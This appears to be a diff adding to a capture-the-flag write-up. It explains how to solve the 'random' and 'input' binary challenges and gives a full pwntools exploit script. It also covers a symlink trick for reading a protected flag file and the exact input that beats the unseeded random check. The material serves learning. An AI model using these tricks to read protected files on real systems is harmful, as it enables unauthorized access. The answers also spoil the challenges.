@@ -207,3 +207,68 @@ if __name__ == "__main__":
 
 ### random 
 This challenge includes a binary that attempts to implement the C library's `random` function. However, the key flaw is that the `random()` call is not first seeded, meaning that the random value generated will be the same each run.  Opening in gdb and setting a breakpoint after the call shows that the value is always equal to 0x6b8b4567.  Since the xor operation is reversible, simply calculating `0x6b8b4567 ^ 0xdeadbeef` yields the valid input `3039230856`.  Passing this value into the binary successfully elevates privileges and cats the flag.  
+
+### input 
+This challenge is less about pwning / reversing and more about interacting with binaries.  The binary requires that we interact with it in five specific ways:
+* First, we need to open the process with 100 arguments (including the argument for the executable itself).  This is most easily done by creating a list and using pwntool's `process` module to open the binary with the listed arguments.  Furthermore, we need to make sure that the 'A'th (aka 41st) and 'B'th (aka 42nd) argument in the list adhere to the binary's requirement of `\x00` and `\x20\x0a\x0d`.  
+* Second, we need to send the binary data, which is receives on two different file descriptors.  The first is the `stdin` descriptor, which is the default used by pwntools's `process.send()` function.  The second is `fd=2`, which is `stderr`.  We can load this file descriptor by first creating a pipe using `os.pipe()` and mapping the input of the pipe to `stderr=` in the process's creation.  This will allow us to use `os.write(fd, data)` to write to the `stderr` file descriptor.  
+* Third, we need to set environment variables to specific values. This is easy using Python's `os.environ()` function.  
+* Fourth, the binary opens a file `\x0a` and compares its data to a predetermined string.  To create a file we need to be in the `/tmp` directory, since the `/home` directories do not have write privileges.  Simply opening, writing to, and closing the file is sufficient to pass this check
+* Finally, the binary takes the 'C'th (aka 43rd) argument and uses that as a port to listen on for communication.  We can choose a random high number port value (to avoid conflicts) and create a socket using Python `socket` library.  Connecting to `localhost` and sending the required data passes the test
+
+This is all sufficient to pass the five requirements, however we are at an impasse; the binary tries to cat `./flag`, however the flag file does not reside in `/tmp`. We cannot `cp` the flag file because we do not have read permissions in `/home/`, nor can we run the script from `/home` because we cannot create the required `\x0a` file in the `/home` directory.  The solution is to create a symlink between a local `flag` file and the actual flag file in `/home/input2`.  The command `ln -sf /home/input2/flag flag` accomplishes this goal and achieves escalated privileges. 
+
+~~~python
+from pwn import *
+import sys
+import socket
+
+port = 19564
+r, w = os.pipe()
+def stage1():
+        argv1 = ['/home/input2/input']
+        for i in range(0,99):
+                if (i == ord('A') - 1):
+                        argv1.append('\x00')
+                elif (i == ord('B') - 1):
+                        argv1.append("\x20\x0a\x0d")
+                elif (i == ord('C') - 1):
+                        argv1.append(str(port)) # set up port for Stage 5
+                else:
+                        argv1.append(str(i))
+        p = process(argv=argv1,stderr=r) # set up stderr for Stage 2
+        os.close(r)
+        return p
+
+def stage2(p):
+        p.send("\x00\x0a\x00\xff")
+        os.write(w,b"\x00\x0a\x02\xff")
+
+def stage3():
+        os.environ["\xde\xad\xbe\xef"] = "\xca\xfe\xba\xbe"
+        assert(os.getenv("\xde\xad\xbe\xef") == "\xca\xfe\xba\xbe")
+
+def stage4():
+        f = open("\x0a", 'w')
+        f.write('\x00\x00\x00\x00')
+        f.close()
+
+def stage5():
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('127.0.0.1', port))
+        s.send("\xde\xad\xbe\xef")
+        s.close()
+
+def exploit():
+        # set environment variables and file first, otherwise the binray will race (and beat) script
+        stage3()
+        stage4()
+        p = stage1() # open process with correct argv values
+        stage2(p) # send correct values via stdout and stderr
+        stage5()
+        p.interactive()
+
+
+if __name__ == "__main__":
+        exploit()
+~~~
